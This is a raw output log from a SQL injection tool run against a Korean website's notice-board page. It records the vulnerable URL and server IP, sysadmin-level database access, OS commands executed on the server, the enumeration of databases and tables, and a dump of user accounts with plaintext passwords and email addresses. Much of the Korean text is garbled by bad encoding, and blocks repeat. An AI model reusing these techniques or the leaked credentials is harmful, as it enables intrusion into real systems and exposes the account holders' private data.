@@ -1,0 +1,917 @@
+■漏洞信息:============================================================
+ ·URL:http://www.waurank.com/Board/bbsNotice/frmBBSView.asp?page=1&searchpart=&searchstr=&bidx=4&bname=notice
+ ·页面标题：荤捞飘鉴困 辑厚胶 客快珐农 傍瘤荤亲
+ ·参数:page=1&searchpart=&searchstr=&bidx=4&bname=notice
+ ·方法:GET
+ ·类型:String
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:115.93.177.226
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Mon, 04 Apr 2011 09:51:34 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 11911
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDAQSBTACC=AADNNPGAHJCFHECKEMENJDAJ; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：WAURANK_MAIN
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Developer Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DB-SERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：eyerank
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+ActiveLink1	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveLink1.Mdf	
+Auction	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Auction.mdf	
+AnaVi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\AnaVi_Data.MDF	
+TestDB	C:\Program Files\Microsoft SQL Server\MSSQL\Data\TestDB_Data.MDF	
+BoolMoSan	C:\Program Files\Microsoft SQL Server\MSSQL\Data\BoolMoSan_Data.MDF	
+EyeSpy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EyeSpy_Data.MDF	
+ActiveNode	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveNode.Mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.馄?熑?????	08  6 2000  1:27AM	
+dbo			08  6 2000  1:27AM	
+guest		.	08  6 2000  1:27AM	
+DB-SERVER\SQLServer2005MSFTEUser$DB-SERVER$MSSQLSERVER		?..?.??辆甀???.	01 10 2008  1:56PM	
+##MS_AgentSigningCertificate##		?..?.???鞘?????	01 23 2009  9:44AM	
+RSExecRole		?..?.?琁?緹??棑	01 10 2008  2:03PM	
+NT AUTHORITY\NETWORK SERVICE		?..?.	01 10 2008  2:03PM	
+NT AUTHORITY\SYSTEM		?..?.	01 10 2008  2:03PM	
+eyerank		艝????扝姏伌	03 20 2008 10:09AM	
+db_owner		?..?.......?.	08  6 2000  1:27AM	
+db_accessadmin		?..?.......?.	08  6 2000  1:27AM	
+db_securityadmin		?..?.......?.	08  6 2000  1:27AM	
+db_ddladmin		?..?.......?.	08  6 2000  1:27AM	
+db_backupoperator		?..?.......?.	08  6 2000  1:27AM	
+db_datareader		?..?.......?.	08  6 2000  1:27AM	
+db_datawriter		?..?.......?.	08  6 2000  1:27AM	
+db_denydatareader		?..?.......?.	08  6 2000  1:27AM	
+db_denydatawriter		?..?.......?.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB-SERVER	SQL Server	SQLOLEDB	DB-SERVER		DB-SERVER	
+121.125.73.42	SQL Server	SQLOLEDB	121.125.73.42		121.125.73.42	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+■ipconfig
+1		
+2	Windows IP Configuration	
+3		
+4		
+5	Ethernet adapter 府倔IP:	
+6		
+7	   Media State . . . . . . . . . . . : Media disconnected	
+8		
+9	Ethernet adapter 啊惑IP:	
+10		
+11	   Connection-specific DNS Suffix  . : 	
+12	   IP Address. . . . . . . . . . . . : 192.168.0.2	
+13	   Subnet Mask . . . . . . . . . . . : 255.255.255.0	
+14	   Default Gateway . . . . . . . . . : 192.168.0.1	
+15		
+■cscript c:\vWeb.vbs
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4	c:\vWeb.vbs(23, 16) Microsoft VBScript 哪颇老 坷幅: 'for' 风橇 牧飘费 函荐啊 肋给登菌嚼聪促.	
+5		
+6		
+Dir of D:: 
+
+DOCS\
+I386\
+PRINTERS\
+SUPPORT\
+VALUEADD\
+AUTORUN.INF
+BOOTFONT.BIN
+README.HTM
+SETUP.EXE
+WIN51
+WIN51IS
+
+Dir of C:: 
+
+467ad90fd1047695940ed69ceaf18e\
+9f6a181ecd46339389651308c1ec960e\
+BackUp\
+baf5dc9fd13b6e148c8add\
+BULK_INSERT\
+Config.Msi\
+Data\
+DBMgr\
+Documents and Settings\
+Inetpub\
+Intel\
+Log\
+MySQL\
+OnMiner\
+Oracle\
+Program Files\
+RECYCLER\
+sybase\
+System Volume Information\
+Temp\
+TempEI4\
+WINDOWS\
+wmpub\
+Work\
+WUTemp\
+AUTOEXEC.BAT
+CONFIG.SYS
+csf_bbs_data.csv
+csf_bbs_data.xls
+csf_bbs_data2.xls
+intelinstall.log
+iobw.tst
+Roadweb.zip
+spoool_090312.xls
+SQLQuery8.sql
+SystemReqTest.log
+vWeb.vbs
+
+Dir of C:\Data: 
+
+FMT\
+JP_GW\
+OnMiner\
+
+Dir of C:\Work: 
+
+chilgok\
+DAT1\
+eyerank\
+forest\
+hplus\
+OnMiner\
+roadweb\
+TEST\
+wgwg\
+蒲胶锅龋格废.txt
+TRUNCATE_TBL.sql
+TRUNCATE_TBL_1.sql
+
+Dir of C:\Work\roadweb: 
+
+cmb_tmp_activity.txt
+
+Dir of C:\Work\wgwg: 
+
+
+Dir of E:: 
+
+
+Dir of D:\SUPPORT: 
+Dir of D:\DOCS: 
+
+READ1ST.TXT
+RELNOTES.HTM
+SERVER1.TXT
+SERVER2.TXT
+SERVER3.TXT
+SERVER4.TXT
+WNET_H_S_RGB_AI.GIF
+
+Dir of C:\WUTemp: 
+
+
+Dir of C:\Work\wgwg: 
+
+
+Dir of C:\System Volume Information: 
+
+
+Dir of C:\OnMiner: 
+
+BIN\
+DAT1\
+DAT2\
+DATA\
+DTSX\
+Log\
+
+Dir of C:\MySQL: 
+
+bin\
+data\
+data1\
+data4\
+data5\
+locale\
+share\
+Tools\
+EXCEPTIONS-CLIENT
+my.ini
+my-huge.ini
+my-innodb-heavy-4G.ini
+my-large.ini
+my-medium.ini
+my-small.ini
+my-template.ini
+
+Dir of C:\467ad90fd1047695940ed69ceaf18e: 
+
+sqlprov.log
+
+Dir of C:\9f6a181ecd46339389651308c1ec960e: 
+
+1025\
+1028\
+1029\
+1030\
+1031\
+1032\
+1033\
+1035\
+1036\
+1037\
+1038\
+1040\
+1041\
+1042\
+1043\
+1044\
+1045\
+1046\
+1049\
+1053\
+1055\
+2052\
+2070\
+3076\
+3082\
+$shtdwn$.req
+DHtmlHeader.html
+header.bmp
+HotFixInstaller.exe
+NDP20SP2-KB979909.msp
+ParameterInfo.xml
+watermark.bmp
+
+
+■数据库信息:============================================================
+- 数据库名：WAURANK_MAIN
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Developer Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DB-SERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：eyerank
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+ActiveLink1	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveLink1.Mdf	
+Auction	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Auction.mdf	
+AnaVi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\AnaVi_Data.MDF	
+TestDB	C:\Program Files\Microsoft SQL Server\MSSQL\Data\TestDB_Data.MDF	
+BoolMoSan	C:\Program Files\Microsoft SQL Server\MSSQL\Data\BoolMoSan_Data.MDF	
+EyeSpy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EyeSpy_Data.MDF	
+ActiveNode	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveNode.Mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+data_eyerank	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_eyerank.mdf	
+data_eyerank_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_eyerank_NURI.mdf	
+data_forest_NURI	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_forest_NURI.mdf	
+data_forest_OnMiner	C:\Program Files\Microsoft SQL Server\MSSQL\data\data_forest_OnMiner_Data.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.馄?熑?????	08  6 2000  1:27AM	
+dbo			08  6 2000  1:27AM	
+guest		.	08  6 2000  1:27AM	
+DB-SERVER\SQLServer2005MSFTEUser$DB-SERVER$MSSQLSERVER		?..?.??辆甀???.	01 10 2008  1:56PM	
+##MS_AgentSigningCertificate##		?..?.???鞘?????	01 23 2009  9:44AM	
+RSExecRole		?..?.?琁?緹??棑	01 10 2008  2:03PM	
+NT AUTHORITY\NETWORK SERVICE		?..?.	01 10 2008  2:03PM	
+NT AUTHORITY\SYSTEM		?..?.	01 10 2008  2:03PM	
+eyerank		艝????扝姏伌	03 20 2008 10:09AM	
+db_owner		?..?.......?.	08  6 2000  1:27AM	
+db_accessadmin		?..?.......?.	08  6 2000  1:27AM	
+db_securityadmin		?..?.......?.	08  6 2000  1:27AM	
+db_ddladmin		?..?.......?.	08  6 2000  1:27AM	
+db_backupoperator		?..?.......?.	08  6 2000  1:27AM	
+db_datareader		?..?.......?.	08  6 2000  1:27AM	
+db_datawriter		?..?.......?.	08  6 2000  1:27AM	
+db_denydatareader		?..?.......?.	08  6 2000  1:27AM	
+db_denydatawriter		?..?.......?.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	1268	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB-SERVER	SQL Server	SQLOLEDB	DB-SERVER		DB-SERVER	
+121.125.73.42	SQL Server	SQLOLEDB	121.125.73.42		121.125.73.42	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+■reg query "HKLM\SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots" /V "/"
+1	坷幅: 坷幅: 矫胶袍捞 瘤沥等 饭瘤胶飘府 虐 肚绰 蔼阑 茫阑 荐 绝嚼聪促.	
+2		
+!!!!!!!!!!!!! No USB dongle! !!!!!!!!!!!!!!
+■dir c:\m.exe
+1	 C 靛扼捞宏狼 杭俘俊绰 捞抚捞 绝嚼聪促.	
+2	 杭俘 老访 锅龋: 30BC-B5D2	
+3		
+4	 c:\ 叼泛磐府	
+5		
+6	2011-04-05  坷饶 10:22                 0 m.exe	
+7	               1俺 颇老                   0 官捞飘	
+8	               0俺 叼泛磐府  63,599,181,824 官捞飘 巢澜	
+9		
+■cscript c:\m.exe
+1	Microsoft (R) Windows Script Host 滚傈 5.6	
+2	Copyright (C) Microsoft Corporation 1996-2001. All rights reserved.	
+3		
+4	涝仿 坷幅: 颇老 犬厘磊 ".exe"俊 秦寸窍绰 胶农赋飘 浚柳捞 绝嚼聪促.	
+5		
+
+■数据库信息:============================================================
+- 数据库名：WAURANK_MAIN
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Developer Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DB-SERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：eyerank
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+
+■数据库信息:============================================================
+批次获取基本信息失败，开始逐一获取……
+ ·当前数据库:WAURANK_MAIN
+ ·版本:Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Developer Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+ActiveLink1	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveLink1.Mdf	
+Auction	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Auction.mdf	
+AnaVi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\AnaVi_Data.MDF	
+TestDB	C:\Program Files\Microsoft SQL Server\MSSQL\Data\TestDB_Data.MDF	
+BoolMoSan	C:\Program Files\Microsoft SQL Server\MSSQL\Data\BoolMoSan_Data.MDF	
+EyeSpy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EyeSpy_Data.MDF	
+ActiveNode	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveNode.Mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+public		?..?.馄?熑?????	08  6 2000  1:27AM	
+dbo			08  6 2000  1:27AM	
+guest		.	08  6 2000  1:27AM	
+DB-SERVER\SQLServer2005MSFTEUser$DB-SERVER$MSSQLSERVER		?..?.??辆甀???.	01 10 2008  1:56PM	
+##MS_AgentSigningCertificate##		?..?.???鞘?????	01 23 2009  9:44AM	
+RSExecRole		?..?.?琁?緹??棑	01 10 2008  2:03PM	
+NT AUTHORITY\NETWORK SERVICE		?..?.	01 10 2008  2:03PM	
+NT AUTHORITY\SYSTEM		?..?.	01 10 2008  2:03PM	
+eyerank		艝????扝姏伌	03 20 2008 10:09AM	
+db_owner		?..?.......?.	08  6 2000  1:27AM	
+db_accessadmin		?..?.......?.	08  6 2000  1:27AM	
+db_securityadmin		?..?.......?.	08  6 2000  1:27AM	
+db_ddladmin		?..?.......?.	08  6 2000  1:27AM	
+db_backupoperator		?..?.......?.	08  6 2000  1:27AM	
+db_datareader		?..?.......?.	08  6 2000  1:27AM	
+db_datawriter		?..?.......?.	08  6 2000  1:27AM	
+db_denydatareader		?..?.......?.	08  6 2000  1:27AM	
+db_denydatawriter		?..?.......?.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+	background			RESOURCE MONITOR		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	2472	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	2472	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	2472	AWAITING COMMAND		
+Capture 览侩 橇肺弊伐	sleeping	ACTIVELINK4	2472	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+DB-SERVER	SQL Server	SQLOLEDB	DB-SERVER		DB-SERVER	
+121.125.73.42	SQL Server	SQLOLEDB	121.125.73.42		121.125.73.42	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+------------------------------------------------------------
+正在获取数据库 [WAURANK_MAIN] 的表名……
+ eye_bbs_faq
+eye_code_display
+eye_zipcode
+eye_user_memo
+eye_bbs_data
+eye_bbs_admin
+syscommand
+t_t
+wau_sw_free_req
+sysc
+eye_user_master
+
+------------------------------------------------------------
+正在获取 [WAURANK_MAIN].[eye_user_memo] 的列名……
+ idxNum
+c_User_ID
+A_ID
+A_Memo
+t_RegDate
+t_ModDate
+
+------------------------------------------------------------
+正在获取 [WAURANK_MAIN].[eye_user_master] 的列名……
+ U_Idx
+c_User_ID
+c_PW
+c_Master_ID
+c_Name
+c_Mail
+c_Tel
+c_Fax
+c_HP
+c_Company
+c_Boss_Name
+c_Place
+c_Position
+c_PNo_CNo
+c_Zip
+c_Addr1
+c_Addr2
+c_Condition
+c_Industry
+c_Memo
+i_Type
+i_Status
+i_User_Grade
+i_dbType
+i_ANALYSIS_ID
+t_RegDate
+t_ModDate
+
+正在执行查询：select top 3 U_Idx,c_User_ID,c_PW,c_Mail from WAURANK_MAIN..eye_user_master order by c_Mail
+1	guest	guest	guest@eyerank.com	
+2	admin	vulcan49	eyerank@eyerank.com	
+8	onminer	mclaren	eyerank@daum.net	
+正在执行查询：select top 2147483647 U_Idx,c_User_ID,c_PW,c_Mail from WAURANK_MAIN..eye_user_master order by c_Mail
+1	guest	guest	guest@eyerank.com	
+2	admin	vulcan49	eyerank@eyerank.com	
+8	onminer	mclaren	eyerank@daum.net	
+8	onminer	mclaren	eyerank@daum.net	
+9	lovemiho	Winkill	ceo@wonjininfo.co.kr	
+10	wb0204	1023ctn	ceo@worldbiznet.co.kr	
+11	ctn111	1023ctn	ctn111@gmail.com	
+12	yahomail	ohshcom	chmod4755@hotmail.com	
+13	taxyshop	dldlfwo21	taxyshop@gmail.com	
+14	jaeyouen	0723	jaeyouen72@kesti.co.kr	
+------------------------------------------------------------
+正在获取数据库 [data_forest_OnMiner] 的表名……
+ alr_domain
+alr_navigation
+alr_url
+azr_focusX
+azr_focusY
+azr_hit
+azr_impression
+azr_maximpression
+azr_navigation
+azr_section
+cmb_activity
+cmb_bookmark
+cmb_category
+cmb_tmp_activity
+cmb_url
+sysdiagrams
+azm_focusX
+azm_focusY
+azm_hit
+azm_impression
+azm_interest
+azm_maximpression
+azm_navigation
+azm_section
+azr_statistics
+azm_pageview
+azr_pageview
+cmb_clickstream
+azr_interest
+cmb_section
+akl_tmp
+akr_domsize
+akr_keyword
+alr_activity
+alr_counter
+
+
+■数据库信息:============================================================
+- 数据库名：WAURANK_MAIN
+- 用户名：dbo
+- 版本：Microsoft SQL Server 2005 - 9.00.3042.00 (Intel X86) 
+	Feb  9 2007 22:47:07 
+	Copyright (c) 1988-2005 Microsoft Corporation
+	Developer Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：DB-SERVER
+- 服务名：MSSQLSERVER
+- 系统用户名：eyerank
+
+■发现SQL2005，建议您先切换到 '杂项工具' 标签页面开启相关设置。
+ ·当前用户权限：
+sysadmin(sa): 1
+dbcreator): 1
+bulkadmin: 1
+diskadmin: 1
+serveradmin: 1
+public: 1
+db_owner: 1
+db_backupoperator: 1
+db_datawriter: 1
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+tempdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\tempdb.mdf	
+model	C:\Program Files\Microsoft SQL Server\MSSQL\data\model.mdf	
+msdb	C:\Program Files\Microsoft SQL Server\MSSQL\data\msdbdata.mdf	
+pubs	C:\Program Files\Microsoft SQL Server\MSSQL\data\pubs.mdf	
+Northwind	C:\Program Files\Microsoft SQL Server\MSSQL\data\northwnd.mdf	
+ActiveLink1	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveLink1.Mdf	
+Auction	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Auction.mdf	
+AnaVi	C:\Program Files\Microsoft SQL Server\MSSQL\Data\AnaVi_Data.MDF	
+TestDB	C:\Program Files\Microsoft SQL Server\MSSQL\Data\TestDB_Data.MDF	
+BoolMoSan	C:\Program Files\Microsoft SQL Server\MSSQL\Data\BoolMoSan_Data.MDF	
+EyeSpy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\EyeSpy_Data.MDF	
+ActiveNode	C:\Program Files\Microsoft SQL Server\MSSQL\Data\ActiveNode.Mdf	
+Spy	C:\Program Files\Microsoft SQL Server\MSSQL\Data\Spy_Data.MDF	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+master	C:\Program Files\Microsoft SQL Server\MSSQL\data\master.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
+ActiveSpy	C:\Program Files\Microsoft SQL Server\MSSQL\data\ActiveSpy.mdf	
